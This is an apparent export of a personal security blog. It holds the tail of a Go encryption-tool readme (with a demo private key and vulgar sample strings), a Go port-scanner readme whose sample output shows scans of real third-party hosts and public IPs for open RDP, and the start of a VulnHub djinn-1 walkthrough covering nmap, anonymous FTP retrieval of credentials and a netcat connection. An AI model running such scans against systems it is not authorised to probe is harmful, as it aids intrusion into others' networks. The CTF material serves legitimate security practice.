<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casdc 9999</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casdc], your choice [9999]&#125;</span><br><span class="line">-- Generating ECC public and private keys......</span><br><span class="line">-- generat ECC public and private key successful......</span><br><span class="line">-- your ECC public key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">------------------------------------------------------</span><br><span class="line">-- your ECC private key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>then input your string to encode</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n 我草泥马 38</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [我草泥马], your choice [38]&#125;</span><br><span class="line">-- Reading eccpublic key from eccpublic.pem...</span><br><span class="line">-- eccpublic key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Encryption......</span><br><span class="line">- start writing ECC encrypted data to ecc-encrypted.txt...</span><br><span class="line">- convert plaintext [我草泥马] to ECC hex encryption result [046210648396eadeec655a5e9e72f15ad49f140df0f04a825b499b902f471997b3b5f95b407d006441483bd2caf9717bb8a985457ffd08e59cb5ff65a68402a807b5c959953ac3c1ea17127a9aae06dddbb540cc43218ca6b100e15c3631d1e7155728b5171c1235bd6abe676732aa03268976e657a9a16e3a26678891]</span><br><span class="line">-----------------ecc encryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>then decode the encrypted text to plaintext</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casd 39</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casd], your choice [39]&#125;</span><br><span class="line">-- Reading eccprivate key from eccprivate.pem...</span><br><span class="line">-- eccprivate key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Decryption......</span><br><span class="line">[+] Reading byte ecc encrypted data from ecc-encrypted.txt...</span><br><span class="line">- convert ecc encrypted byte data from ecc-encrypted.txt to plaintext: [我草泥马]</span><br><span class="line">-----------------ecc decryption over-----------------</span><br></pre></td></tr></table></figure>

<h2 id="En-Dedode-a-string-with-spaces-include-using-ECC-Encryption"><a href="#En-Dedode-a-string-with-spaces-include-using-ECC-Encryption" class="headerlink" title="En/Dedode a string with spaces include using ECC Encryption"></a>En/Dedode a string with spaces include using ECC Encryption</h2><ul>
<li>first generate ecc public and private key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casdc 9999</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casdc], your choice [9999]&#125;</span><br><span class="line">-- Generating ECC public and private keys......</span><br><span class="line">-- generat ECC public and private key successful......</span><br><span class="line">-- your ECC public key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">------------------------------------------------------</span><br><span class="line">-- your ECC private key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>then input your string to encode</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y 我 操 你 妈妈</span><br><span class="line">- you choose [y]</span><br><span class="line">- &#123;your string [我 操 你 妈妈</span><br><span class="line">]&#125;</span><br><span class="line">38</span><br><span class="line">- &#123;your choice [38]&#125;</span><br><span class="line">-- Reading eccpublic key from eccpublic.pem...</span><br><span class="line">-- eccpublic key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Encryption......</span><br><span class="line">- start writing ECC encrypted data to ecc-encrypted.txt...</span><br><span class="line">- convert plaintext [我 操 你 妈妈</span><br><span class="line">] to ECC hex encryption result [0499173f0b7246278597bb1268ba64da228b6e447ea184dfa8c14277fff6c7da170cd24acf341ae2856137c90c00b495573484dd0bc133aae1a5540a17fcda9dd37b47d037f1410acc6b4ebcaa47ae18fd1b23bcc47cce5fa27b8746a1143908b9bab8cdea55d76ffc9f82e88ef2345240f7d10dde9962967bd6077c3e7f8023eb9e06b658]</span><br><span class="line">-----------------ecc encryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>then decode the encrypted text to plaintext</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y casd</span><br><span class="line">- you choose [y]</span><br><span class="line">- &#123;your string [casd</span><br><span class="line">]&#125;</span><br><span class="line">39</span><br><span class="line">- &#123;your choice [39]&#125;</span><br><span class="line">-- Reading eccprivate key from eccprivate.pem...</span><br><span class="line">-- eccprivate key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Decryption......</span><br><span class="line">[+] Reading byte ecc encrypted data from ecc-encrypted.txt...</span><br><span class="line">- convert ecc encrypted byte data from ecc-encrypted.txt to plaintext: [我 操 你 妈妈</span><br><span class="line">]</span><br><span class="line">-----------------ecc decryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>other en/decryption method are just like this</li>
</ul>
<h4 id="Support-Encryption-and-decryption-algorithm"><a href="#Support-Encryption-and-decryption-algorithm" class="headerlink" title="Support Encryption and decryption algorithm"></a>Support Encryption and decryption algorithm</h4><ul>
<li><ol>
<li>base64 encode</li>
</ol>
</li>
<li><ol start="2">
<li>base64 decode</li>
</ol>
</li>
<li><ol start="3">
<li>Aes cbc model encode</li>
</ol>
</li>
<li><ol start="4">
<li>Aes cbc model decode</li>
</ol>
</li>
<li><ol start="5">
<li>Aes ecb model encode</li>
</ol>
</li>
<li><ol start="6">
<li>Aes ecb model decode</li>
</ol>
</li>
<li><ol start="7">
<li>Aes cfb model encode</li>
</ol>
</li>
<li><ol start="8">
<li>Aes cfb model decode</li>
</ol>
</li>
<li><ol start="9">
<li>hex encode (ASCII hex)</li>
</ol>
</li>
<li><ol start="10">
<li>hex decode (ASCII hex)</li>
</ol>
</li>
<li><ol start="11">
<li>md5 encode (md5($pass.$salt);Joomia)</li>
</ol>
</li>
<li><ol start="12">
<li>sha1 encode</li>
</ol>
</li>
<li><ol start="13">
<li>hmac encode (md5)</li>
</ol>
</li>
<li><ol start="14">
<li>sha256 encode</li>
</ol>
</li>
<li><ol start="15">
<li>hmac-sha1 encode</li>
</ol>
</li>
<li><ol start="17">
<li>hmac-sha512 encode</li>
</ol>
</li>
<li><ol start="18">
<li>Base64Url Safe encode &lt;not contain (‘/‘,’+’);replaced by (‘_’,’-‘);(‘=’) removed&gt;</li>
</ol>
</li>
<li><ol start="19">
<li>Base64Url Safe decode</li>
</ol>
</li>
<li><ol start="20">
<li>des Ecb encryption</li>
</ol>
</li>
<li><ol start="21">
<li>des Ecb decryption</li>
</ol>
</li>
<li><ol start="22">
<li>des Cbc encryption</li>
</ol>
</li>
<li><ol start="23">
<li>des Cbc decryption</li>
</ol>
</li>
<li><ol start="24">
<li>3des Cbc encryption</li>
</ol>
</li>
<li><ol start="25">
<li>3des Cbc decryption</li>
</ol>
</li>
<li><ol start="26">
<li>Ripemd160 encryption</li>
</ol>
</li>
<li><ol start="27">
<li>3des Ecb encryption</li>
</ol>
</li>
<li><ol start="28">
<li>3des Ecb decryption</li>
</ol>
</li>
<li><ol start="29">
<li>Rc4 encryption</li>
</ol>
</li>
<li><ol start="30">
<li>AzDG encryption</li>
</ol>
</li>
<li><ol start="31">
<li>AzDG decryption</li>
</ol>
</li>
<li><ol start="32">
<li>Aes CTR encryption</li>
</ol>
</li>
<li><ol start="33">
<li>Aes CTR decryption</li>
</ol>
</li>
<li><ol start="34">
<li>PBKDF2 encryption (set &lt;passwdrd, salt, iter, keylen, hash&gt; to strong encrypt data)</li>
</ol>
</li>
<li><ol start="999">
<li>[–Generate Rsa Public and Private Key :)–]</li>
</ol>
</li>
<li><ol start="35">
<li>RSA hex formate encryption</li>
</ol>
</li>
<li><ol start="36">
<li>RSA hex formate decryption</li>
</ol>
</li>
<li><ol start="37">
<li>RSA sign confirm</li>
</ol>
</li>
<li><ol start="9999">
<li>[ECC Key generate] –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="38">
<li>ECC Encryption –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="39">
<li>ECC Decryption –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="40">
<li>ECC sign confirm –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="41">
<li>Blowfish Ecb Encryption</li>
</ol>
</li>
<li><ol start="42">
<li>Blowfish Ecb Decryption</li>
</ol>
</li>
<li><ol start="43">
<li>Md4 encryption</li>
</ol>
</li>
<li><ol start="44">
<li>Aes Gcm Encryption [Ethereum Whisper protocol used]</li>
</ol>
</li>
<li><ol start="45">
<li>Aes Gcm Decryption [Ethereum Whisper protocol used]</li>
</ol>
</li>
<li><ol start="46">
<li>des Cfb encryption</li>
</ol>
</li>
<li><ol start="47">
<li>des Cfb decryption</li>
</ol>
</li>
<li><ol start="48">
<li>AES OFB Encryption</li>
</ol>
</li>
<li><ol start="49">
<li>AES OFB Decryption</li>
</ol>
</li>
<li><ol start="50">
<li>des Ctr encryption</li>
</ol>
</li>
<li><ol start="51">
<li>des Ctr decryption</li>
</ol>
</li>
<li><ol start="52">
<li>des Ofb encryption</li>
</ol>
</li>
<li><ol start="53">
<li>des Ofb decryption</li>
</ol>
</li>
<li><ol start="54">
<li>Elliptic Curve Digital Signature Verified</li>
</ol>
</li>
<li><ol start="55">
<li>Vertfied pub key types</li>
</ol>
</li>
<li><ol start="56">
<li>HKDF encryption</li>
</ol>
</li>
<li><ol start="57">
<li>base32 encryption</li>
</ol>
</li>
<li><ol start="58">
<li>base32 decryption</li>
</ol>
</li>
<li><ol start="59">
<li>nacl box encryption and decryption</li>
</ol>
</li>
<li><ol start="60">
<li>nacl secretbox encryption and decryption</li>
</ol>
</li>
<li><ol start="61">
<li>scrypt encryption [Bitcoin used strong encryption]</li>
</ol>
</li>
<li><ol start="62">
<li>Shake256 encryption</li>
</ol>
</li>
<li><ol start="63">
<li>Caesar encryption</li>
</ol>
</li>
<li><ol start="64">
<li>Caesar decryption</li>
</ol>
</li>
<li><ol start="65">
<li>hex dump</li>
</ol>
</li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>支持多达65种加解密算法</li>
<li>彩色输出美化</li>
<li>持续添加更多算法支持</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goendecoder.exe放在同一目录下即可</li>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p><font color="yellow">:) enjoy it ! :)</font></p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>ctf tools</tag>
      </tags>
  </entry>
  <entry>
    <title>goportscan-go调用最大cpu内核数实现批量ip列表tcp端口快速扫描</title>
    <url>/2020/03/25/goportscan/</url>
    <content><![CDATA[<p><font color="green">支持ip列表快速批量tcp65535全端口扫描，并将结果写入txt文件，由本菜独立开发。。。</font></p>
<h4 id="Tcp-Fast-Port-Scanner"><a href="#Tcp-Fast-Port-Scanner" class="headerlink" title="Tcp Fast Port Scanner"></a>Tcp Fast Port Scanner</h4><hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li>By Lucifer11</li>
<li>My QQ:1185151867</li>
<li><a href="https://fdlucifer.github.io/">My Blog</a></li>
</ul>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3BvcnRzY2Fu">download goportscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -h</span><br><span class="line">Usage of goportscan.exe:</span><br><span class="line">  -allports string</span><br><span class="line">        select this option to scan all open ports <span class="keyword">in</span> 65535 ports (default <span class="string">&quot;n&quot;</span>)</span><br><span class="line">  -end-port int</span><br><span class="line">        the port from whitch the scanning ends (default 10000)</span><br><span class="line">  -ipfile string</span><br><span class="line">        the file stored ip list (default <span class="string">&quot;iplist.txt&quot;</span>)</span><br><span class="line">  -start-port int</span><br><span class="line">        the port on whitch the scanning starts (default 1)</span><br><span class="line">  -timeout duration</span><br><span class="line">        timeout (default 500ms)</span><br></pre></td></tr></table></figure>

<h2 id="批量扫ip65535全端口"><a href="#批量扫ip65535全端口" class="headerlink" title="批量扫ip65535全端口"></a>批量扫ip65535全端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -allports y</span><br><span class="line">...</span><br><span class="line">[+] scanning host: [163.com], port: [64660]</span><br><span class="line">[+] scanning host: [163.com], port: [64642]</span><br><span class="line">[+] scanning host: [163.com], port: [65094]</span><br><span class="line">[+] scanning host: [163.com], port: [64655]</span><br><span class="line">[+] scanning host: [163.com], port: [65173]</span><br><span class="line">[+] scanning host: [163.com], port: [65311]</span><br><span class="line">[+] scanning host: [163.com], port: [64934]</span><br><span class="line">[+] scanning host: [163.com], port: [60555]</span><br><span class="line">[+] scanning host: [163.com], port: [60259]</span><br><span class="line">[+] scanning host: [163.com], port: [64640]</span><br><span class="line">[+] host [163.com] opening ports: [443 80]</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [4399.com] Resolved address is [118.184.184.70]</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goportscan/master/pics/allports.jpg"></li>
</ul>
<h2 id="批量扫ip3389端口"><a href="#批量扫ip3389端口" class="headerlink" title="批量扫ip3389端口"></a>批量扫ip3389端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -start-port 3389 -end-port 3389</span><br><span class="line">......</span><br><span class="line">[+] [60.31.205.76] Resolved address is [60.31.205.76]</span><br><span class="line">[+] scanning host: [60.31.205.76], port: [3389]</span><br><span class="line">[+] host [60.31.205.76] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [119.23.85.137] Resolved address is [119.23.85.137]</span><br><span class="line">[+] scanning host: [119.23.85.137], port: [3389]</span><br><span class="line">[+] host [119.23.85.137] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [39.104.21.7] Resolved address is [39.104.21.7]</span><br><span class="line">[+] scanning host: [39.104.21.7], port: [3389]</span><br><span class="line">[+] host [39.104.21.7] opening ports: [3389]</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [106.12.118.25] Resolved address is [106.12.118.25]</span><br><span class="line">[+] scanning host: [106.12.118.25], port: [3389]</span><br><span class="line">[+] host [106.12.118.25] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] iplist scan finished!</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goportscan/master/pics/singleport.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>批量快速快速扫描ip文件列表，并遍历65535全端口</li>
<li>ip和域名都能扫</li>
<li>扫描结果以ip:[port]形式放入resultip.txt文件中</li>
<li>支持批量ip单端口扫描</li>
<li>持续添加新功能</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goportscan.exe放在同一目录下即可</li>
</ul>
<h3 id="QQ-or-微信"><a href="#QQ-or-微信" class="headerlink" title="QQ or 微信"></a>QQ or 微信</h3><ul>
<li>1185151867</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[djinn-1]</title>
    <url>/2020/05/21/djinn-1/</url>
    <content><![CDATA[<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: djinn: 1<br>Date release: 18 Nov 2019</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTGxUNUpjZGx5RFVjdmtuMTJ0OW9JSUZvMFg5R3Q1M0Ivdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1LlT5JcdlyDUcvkn12t9oIIFo0X9Gt53B/view?usp=sharing<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kamlubi9kamlubi5vdmE=">https://download.vulnhub.com/djinn/djinn.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kamlubi9kamlubi5vdmEudG9ycmVudA==">https://download.vulnhub.com/djinn/djinn.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><ul>
<li>Level: Beginner-Intermediate</li>
<li>flags: user.txt and root.txt</li>
<li>Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You’ll see the IP right on the login screen. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively.</li>
<li>Format: Virtual Machine (Virtualbox - OVA)</li>
<li>Operating System: Linux</li>
</ul>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.127</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 08:00:27:03:DB:2D (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -sC -v -p- -T4 192.168.56.127</span></span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">21/tcp   open     ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt</span><br><span class="line">| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt</span><br><span class="line">|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.126</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">1337/tcp open     waste?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     ____ _____ _ </span><br><span class="line">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span><br><span class="line">|     \x20/ _ \x20 | | | | <span class="string">&#x27;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span></span><br><span class="line"><span class="string">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span></span><br><span class="line"><span class="string">|     Let&#x27;</span>s see how good you are with simple maths</span><br><span class="line">|     Answer my questions 1000 <span class="built_in">times</span> and I<span class="string">&#x27;ll give you your gift.</span></span><br><span class="line"><span class="string">|     &#x27;</span>*<span class="string">&#x27;, 9)</span></span><br><span class="line"><span class="string">|   RPCCheck: </span></span><br><span class="line"><span class="string">|     ____ _____ _ </span></span><br><span class="line"><span class="string">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span></span><br><span class="line"><span class="string">|     \x20/ _ \x20 | | | | &#x27;</span>_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span><br><span class="line">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span><br><span class="line">|     Let<span class="string">&#x27;s see how good you are with simple maths</span></span><br><span class="line"><span class="string">|     Answer my questions 1000 times and I&#x27;</span>ll give you your gift.</span><br><span class="line">|_    <span class="string">&#x27;+&#x27;</span>, 5)</span><br><span class="line">7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD OPTIONS GET</span><br><span class="line">|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+</span><br><span class="line">|_http-title: Lost <span class="keyword">in</span> space</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>ftp anonymous login, then get three files</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># ftp 192.168.56.127</span></span><br><span class="line">Connected to 192.168.56.127.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.127:root): anonymous </span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt</span><br><span class="line">-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt</span><br><span class="line">-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get creds.txt</span><br><span class="line"><span class="built_in">local</span>: creds.txt remote: creds.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> creds.txt (11 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">11 bytes received <span class="keyword">in</span> 0.00 secs (109.6142 kB/s)</span><br><span class="line">ftp&gt; get game.txt</span><br><span class="line"><span class="built_in">local</span>: game.txt remote: game.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> game.txt (128 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">128 bytes received <span class="keyword">in</span> 0.02 secs (7.0244 kB/s)</span><br><span class="line">ftp&gt; get message.txt</span><br><span class="line"><span class="built_in">local</span>: message.txt remote: message.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> message.txt (113 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">113 bytes received <span class="keyword">in</span> 0.05 secs (2.4331 kB/s)</span><br></pre></td></tr></table></figure>

<p>use cat command to check the content</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># cat creds.txt </span></span><br><span class="line">nitu:81299</span><br><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># cat game.txt </span></span><br><span class="line">oh and I forgot to tell you I<span class="string">&#x27;ve setup a game for you on port 1337. See if you can reach to the </span></span><br><span class="line"><span class="string">final level and get the prize.</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/djinn-1# cat message.txt </span></span><br><span class="line"><span class="string">@nitish81299 I am going on holidays for few days, please take care of all the work. </span></span><br><span class="line"><span class="string">And don&#x27;</span>t mess up anything.</span><br></pre></td></tr></table></figure>

<p>use Netcat to make a connection so that we can play the game</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.127 1337</span></span><br><span class="line">  ____                        _____ _                </span><br><span class="line"> / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ </span><br><span class="line">| |  _ / _` | <span class="string">&#x27;_ ` _ \ / _ \   | | | | &#x27;</span>_ ` _ \ / _ \</span><br><span class="line">| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/</span><br><span class="line"> \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s see how good you are with simple maths</span></span><br><span class="line"><span class="string">Answer my questions 1000 times and I&#x27;</span>ll give you your gift.</span><br><span class="line">(9, <span class="string">&#x27;+&#x27;</span>, 9)</span><br><span class="line">&gt; 18</span><br><span class="line">(3, <span class="string">&#x27;-&#x27;</span>, 1)</span><br><span class="line">&gt; 2</span><br><span class="line">(2, <span class="string">&#x27;/&#x27;</span>, 3)</span><br><span class="line">&gt; 2</span><br><span class="line">Wrong answer</span><br></pre></td></tr></table></figure>

<p>it’s just a  waste time game, go for next step</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/</span><br></pre></td></tr></table></figure>
